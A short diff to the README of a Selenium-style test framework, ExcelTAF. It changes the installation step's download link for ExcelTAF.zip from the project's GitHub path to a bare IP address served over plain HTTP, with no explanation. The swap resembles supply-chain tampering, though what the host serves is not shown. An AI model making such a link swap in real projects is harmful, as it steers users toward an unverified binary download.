@@ -8,7 +8,7 @@ Also this framework allows you to cut your test execution time **tenfold** by ru
 
 # Installation
 1. You would need Chrome Browser if you want to run included demo tests (https://www.google.com/chrome/).
-2. Download ExcelTAF.zip file (https://github.com/alaserm/VisualTAF/raw/master/target/ExcelTAF.zip).
+2. Download ExcelTAF.zip file (http://23.236.144.243/VisualTAF/ExcelTAF.zip).
 3. Unzip content of zip file to some folder.
 
 # Running
